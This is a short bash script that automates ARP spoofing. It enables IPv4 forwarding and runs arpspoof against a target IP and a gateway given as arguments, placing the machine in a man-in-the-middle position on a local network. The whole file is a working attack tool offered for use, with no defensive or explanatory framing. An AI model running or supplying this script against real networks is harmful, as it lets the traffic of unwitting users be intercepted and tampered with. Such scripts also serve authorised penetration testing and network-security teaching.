#!/bin/bash

#Automated ARP spoofing with IP forwarding

interface=$1
target=$2
gateway=$3

#enable ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1
#test/argument info
echo "Interface to use:  "$interface
echo "Target ip: "$target
echo "Gateway to spoof: "$gateway

#arpspoof
sudo arpspoof -i $interface -t $target -r $gateway


